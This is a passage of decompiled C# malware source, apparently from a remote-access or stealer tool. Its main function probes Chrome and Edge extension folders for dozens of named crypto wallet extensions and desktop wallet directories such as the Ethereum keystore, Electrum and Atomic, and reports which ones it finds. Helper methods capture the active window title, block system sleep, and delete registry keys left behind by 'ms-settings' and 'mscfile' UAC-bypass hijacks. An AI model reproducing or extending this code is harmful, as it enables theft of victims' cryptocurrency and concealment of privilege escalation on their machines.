					list.Add("Chrome_Oxygen");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke"))
				{
					dictionary["Chrome_Crocobit"] = true;
					list.Add("Chrome_Crocobit");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"))
				{
					dictionary["Chrome_Keplr"] = true;
					list.Add("Chrome_Keplr");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"))
				{
					dictionary["Chrome_Finnie"] = true;
					list.Add("Chrome_Finnie");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog"))
				{
					dictionary["Chrome_Swash"] = true;
					list.Add("Chrome_Swash");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk"))
				{
					dictionary["Chrome_Starcoin"] = true;
					list.Add("Chrome_Starcoin");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo"))
				{
					dictionary["Chrome_Slope"] = true;
					list.Add("Chrome_Slope");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno"))
				{
					dictionary["Chrome_Sollet"] = true;
					list.Add("Chrome_Sollet");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"))
				{
					dictionary["Chrome_Metamask"] = true;
					list.Add("Chrome_Metamask");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"))
				{
					dictionary["Chrome_Ton"] = true;
					list.Add("Chrome_Ton");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo"))
				{
					dictionary["Chrome_XinPay"] = true;
					list.Add("Chrome_XinPay");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"))
				{
					dictionary["Chrome_Tron"] = true;
					list.Add("Chrome_Tron");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"))
				{
					dictionary["Chrome_Phantom"] = true;
					list.Add("Chrome_Phantom");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"))
				{
					dictionary["Chrome_Mobox"] = true;
					list.Add("Chrome_Mobox");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"))
				{
					dictionary["Chrome_Math"] = true;
					list.Add("Chrome_Math");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel"))
				{
					dictionary["Chrome_Iconex"] = true;
					list.Add("Chrome_Iconex");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"))
				{
					dictionary["Chrome_Guild"] = true;
					list.Add("Chrome_Guild");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"))
				{
					dictionary["Chrome_Equal"] = true;
					list.Add("Chrome_Equal");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"))
				{
					dictionary["Chrome_Coin98"] = true;
					list.Add("Chrome_Coin98");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"))
				{
					dictionary["Chrome_Bitapp"] = true;
					list.Add("Chrome_Bitapp");
				}
				if (Directory.Exists(Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"))
				{
					dictionary["Chrome_Binance"] = true;
					list.Add("Chrome_Binance");
				}
				if (Directory.Exists(Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\klfhbdnlcfcaccoakhceodhldjojboga"))
				{
					dictionary["Edge_Auvitas"] = true;
					list.Add("Edge_Auvitas");
				}
				if (Directory.Exists(Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\dfeccadlilpndjjohbjdblepmjeahlmm"))
				{
					dictionary["Edge_Math"] = true;
					list.Add("Edge_Math");
				}
				if (Directory.Exists(Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"))
				{
					dictionary["Edge_Metamask"] = true;
					list.Add("Edge_Metamask");
				}
				if (Directory.Exists(Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\oooiblbdpdlecigodndinbpfopomaegl"))
				{
					dictionary["Edge_MTV"] = true;
					list.Add("Edge_MTV");
				}
				if (Directory.Exists(Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\aanjhgiamnacdfnlfnmgehjikagdbafd"))
				{
					dictionary["Edge_Rabet"] = true;
					list.Add("Edge_Rabet");
				}
				if (Directory.Exists(Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\bblmcdckkhkhfhhpfcchlpalebmonecp"))
				{
					dictionary["Edge_Ronin"] = true;
					list.Add("Edge_Ronin");
				}
				if (Directory.Exists(Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb"))
				{
					dictionary["Edge_Yoroi"] = true;
					list.Add("Edge_Yoroi");
				}
				if (Directory.Exists(Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\fbekallmnjoeggkefjkbebpineneilec"))
				{
					dictionary["Edge_Zilpay"] = true;
					list.Add("Edge_Zilpay");
				}
				if (Directory.Exists(Appdata + "\\Ethereum\\keystore"))
				{
					dictionary["Ethereum"] = true;
					list.Add("Ethereum");
				}
				if (Directory.Exists(Appdata + "\\Electrum\\wallets"))
				{
					dictionary["Electrum"] = true;
					list.Add("Electrum");
				}
				if (Directory.Exists(Appdata + "\\atomic\\Local Storage\\leveldb"))
				{
					dictionary["Atomic"] = true;
					list.Add("Atomic");
				}
				if (dictionary.Count == 0)
				{
					return "No Wallets Found";
				}
				return string.Join(", ", list);
			}
			catch
			{
			}
			return "No Wallets Found";
		});
	}

	public static string RemoveLastChars(string input, int amount = 2)
	{
		if (input.Length > amount)
		{
			input = input.Remove(input.Length - amount);
		}
		return input;
	}

	public static ImageCodecInfo GetEncoder(ImageFormat format)
	{
		ImageCodecInfo[] imageDecoders = ImageCodecInfo.GetImageDecoders();
		foreach (ImageCodecInfo imageCodecInfo in imageDecoders)
		{
			if (imageCodecInfo.FormatID == format.Guid)
			{
				return imageCodecInfo;
			}
		}
		return null;
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern NativeMethods.EXECUTION_STATE SetThreadExecutionState(NativeMethods.EXECUTION_STATE esFlags);

	public static void PreventSleep()
	{
		try
		{
			SetThreadExecutionState((NativeMethods.EXECUTION_STATE)2147483651u);
		}
		catch
		{
		}
	}

	public static string GetActiveWindowTitle()
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			if (GetWindowText(GetForegroundWindow(), stringBuilder, 256) > 0)
			{
				return stringBuilder.ToString();
			}
		}
		catch
		{
		}
		return "";
	}

	public static void ClearSetting()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Environment");
			if (registryKey.GetValue("windir") != null)
			{
				registryKey.DeleteValue("windir");
			}
			registryKey.Close();
		}
		catch
		{
		}
		try
		{
			Registry.CurrentUser.OpenSubKey("Software", writable: true).OpenSubKey("Classes", writable: true).DeleteSubKeyTree("mscfile");
		}
		catch
		{
		}
		try
		{
			Registry.CurrentUser.OpenSubKey("Software", writable: true).OpenSubKey("Classes", writable: true).DeleteSubKeyTree("ms-settings");
		}
		catch
		{
		}
	}
}
